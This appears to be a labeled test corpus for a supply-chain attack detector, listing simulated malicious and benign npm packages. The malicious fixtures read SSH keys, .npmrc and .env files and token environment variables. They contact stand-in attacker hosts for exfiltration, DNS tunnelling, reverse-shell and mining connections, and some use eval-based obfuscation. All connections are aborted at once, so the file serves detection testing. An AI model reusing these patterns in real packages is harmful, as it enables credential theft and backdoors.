/**
 * BHEESHMA Efficacy Benchmark — Labeled Corpus
 *
 * Each fixture is a self-contained npm package written into a temporary
 * node_modules tree, then required under bheeshma monitoring. Behaviors are
 * modeled on real-world supply-chain attacks (malicious) and on ordinary,
 * legitimate dependency behavior (benign). The benign set is deliberately
 * "noisy but innocent" — network clients, loggers, build tools — because a
 * mature detector must separate those from real attacks without crying wolf.
 *
 * Everything runs OFFLINE and FAST: network/DNS calls are fired (so the hooks
 * record a signal at call time) and then immediately aborted; nothing actually
 * needs to connect. No real secrets are read beyond best-effort reads of files
 * that usually do not exist in this environment.
 *
 * label: 'malicious' | 'benign'
 */

'use strict';

const MALICIOUS = [
    {
        name: 'pkg-shai-hulud-sim',
        version: '1.0.0',
        label: 'malicious',
        attack: 'Install-time secret theft (Shai-Hulud / event-stream class)',
        code: `
            const fs = require('fs');
            const os = require('os');
            const cp = require('child_process');
            const https = require('https');
            try { fs.readFileSync(os.homedir() + '/.npmrc', 'utf8'); } catch (e) {}
            try { fs.readFileSync('.env', 'utf8'); } catch (e) {}
            try { fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8'); } catch (e) {}
            const tok = process.env.NPM_TOKEN || process.env.AWS_SECRET_ACCESS_KEY;
            try { cp.exec('whoami', () => {}); } catch (e) {}
            try { const r = https.request({ host: 'exfil-collector.tk', port: 443, path: '/c', method: 'POST' }); r.on('error', () => {}); r.destroy(); } catch (e) {}
            module.exports = {};
        `
    },
    {
        name: 'pkg-crypto-miner-sim',
        version: '1.0.0',
        label: 'malicious',
        attack: 'Cryptojacking (ua-parser-js class)',
        code: `
            process.env.WALLET_ADDRESS = '44AbcMoneroWalletAddrZZZ';
            process.env.MINING_POOL = 'pool.supportxmr.com:443';
            const cp = require('child_process');
            const net = require('net');
            try { const c = cp.spawn('node', ['-e', '0']); c.on('error', () => {}); } catch (e) {}
            try { const s = net.connect({ host: 'pool.minexmr.com', port: 3333 }); s.on('error', () => {}); s.destroy(); } catch (e) {}
            module.exports = {};
        `
    },
    {
        name: 'pkg-dns-tunnel-sim',
        version: '1.0.0',
        label: 'malicious',
        attack: 'DNS tunneling exfiltration (flatmap-stream class)',
        code: `
            const dns = require('dns');
            const enc = 'YWxhZGRpbjpvcGVuc2VzYW1lZXh0cmFkYXRhYmxvY2sxMjM0';
            try { dns.resolveTxt(enc + '.tunnel.evil-c2.tk', () => {}); } catch (e) {}
            try { dns.lookup('4d5a90000300000004000000ffff0000b800.exfil.evil-c2.tk', () => {}); } catch (e) {}
            module.exports = {};
        `
    },
    {
        name: 'pkg-reverse-shell-sim',
        version: '1.0.0',
        label: 'malicious',
        attack: 'Reverse-shell backdoor (dependency-confusion class)',
        code: `
            const net = require('net');
            const cp = require('child_process');
            try { const s = net.createConnection({ host: '203.0.113.66', port: 4444 }); s.on('error', () => {}); s.destroy(); } catch (e) {}
            try { cp.exec('sh -c "id"', () => {}); } catch (e) {}
            module.exports = {};
        `
    },
    {
        name: 'pkg-obfuscated-loader-sim',
        version: '1.0.0',
        label: 'malicious',
        attack: 'Obfuscated payload + HTTP GET exfil',
        // Entry-point source contains obfuscation indicators (eval/Function/
        // base64/hex) AND performs a deferred http.get to an IP — exercising
        // both the obfuscation scanner and the get-capture/async-attribution fix.
        code: `
            /* eslint-disable */
            var _0x = ["MSsx", "cmV0dXJuIDQy"];
            function _d(i){ return Buffer.from(_0x[i], "base64").toString(); }
            try { var _a = eval(_d(0)); } catch (e) {}
            try { var f = new Function(_d(1)); f(); } catch (e) {}
            var _hex = "4d5a9000030000000400000000004d5a9000030000000400000000004d5a900003";
            setImmediate(function(){
                try { var r = require('http').get({ host: '198.51.100.23', port: 80, path: '/p' }); r.on('error', function(){}); r.destroy(); } catch (e) {}
            });
            module.exports = {};
        `
    },
    {
        name: 'expresss',
        version: '1.0.0',
        label: 'malicious',
        attack: 'Typosquat (crossenv class) — name impersonates "express"',
        code: `
            const https = require('https');
            const tok = process.env.NPM_TOKEN;
            const aws = process.env.AWS_SECRET_ACCESS_KEY;
            try { const r = https.request({ host: 'pastebin.com', port: 443, path: '/api', method: 'POST' }); r.on('error', () => {}); r.destroy(); } catch (e) {}
            module.exports = {};
        `
    },
    {
        name: 'pkg-deferred-exfil-sim',
        version: '1.0.0',
        label: 'malicious',
        attack: 'Async-deferred exfil (evasion: behavior runs after stack unwinds)',
        code: `
            setImmediate(function(){
                const tok = process.env.NPM_TOKEN;
                try { var r = require('https').get({ host: 'collector.evil-c2.tk', port: 443, path: '/x' }); r.on('error', function(){}); r.destroy(); } catch (e) {}
            });
            module.exports = {};
        `
    }
];

const BENIGN = [
    {
        name: 'dotenv',
        version: '1.0.0',
        label: 'benign',
        attack: 'Known config loader (dotenv) legitimately reading .env — context-aware exemption must NOT flag it',
        code: `
            const fs = require('fs');
            try { const c = fs.readFileSync('.env', 'utf8'); } catch (e) {}
            module.exports = { config: function(){ return {}; } };
        `
    },
    {
        name: 'pkg-http-api-client',
        version: '1.0.0',
        label: 'benign',
        attack: 'Legit HTTPS API client (axios-like) calling a normal API host',
        code: `
            const https = require('https');
            try { const r = https.get({ host: 'api.github.com', port: 443, path: '/' }); r.on('error', () => {}); r.destroy(); } catch (e) {}
            try { const r2 = https.get({ host: 'api.github.com', port: 443, path: '/user' }); r2.on('error', () => {}); r2.destroy(); } catch (e) {}
            module.exports = {};
        `
    },
    {
        name: 'pkg-file-logger',
        version: '1.0.0',
        label: 'benign',
        attack: 'Logging library writing to a log file',
        code: `
            const fs = require('fs');
            const os = require('os');
            try { fs.writeFileSync(os.tmpdir() + '/app-bench.log', 'log line\\n'); } catch (e) {}
            module.exports = { log: function(){} };
        `
    },
    {
        name: 'pkg-config-reader',
        version: '1.0.0',
        label: 'benign',
        attack: 'Reads config files + a couple env vars (normal app config)',
        code: `
            const fs = require('fs');
            try { fs.readFileSync(require('path').join(process.cwd(), 'package.json'), 'utf8'); } catch (e) {}
            const env = process.env.NODE_ENV || 'development';
            const port = process.env.PORT || 3000;
            module.exports = { env: env, port: port };
        `
    },
    {
        name: 'pkg-build-tool',
        version: '1.0.0',
        label: 'benign',
        attack: 'Build tool that legitimately spawns a child process (tsc-like)',
        code: `
            const cp = require('child_process');
            try { const c = cp.spawn('node', ['-e', '0']); c.on('error', () => {}); } catch (e) {}
            module.exports = {};
        `
    },
    {
        name: 'pkg-telemetry-sdk',
        version: '1.0.0',
        label: 'benign',
        attack: 'Analytics SDK: env + file read + one HTTPS call (mixed but innocent)',
        code: `
            const https = require('https');
            const fs = require('fs');
            const v = process.env.NODE_ENV;
            try { fs.readFileSync(require('path').join(process.cwd(), 'package.json'), 'utf8'); } catch (e) {}
            try { const r = https.get({ host: 'telemetry.vendor.com', port: 443, path: '/v1/e' }); r.on('error', () => {}); r.destroy(); } catch (e) {}
            module.exports = {};
        `
    },
    {
        name: 'pkg-pure-util',
        version: '1.0.0',
        label: 'benign',
        attack: 'Pure computation, no side effects (lodash-like)',
        code: `
            module.exports = { add: function(a, b){ return a + b; } };
        `
    }
];

module.exports = { MALICIOUS, BENIGN, ALL: [...MALICIOUS, ...BENIGN] };
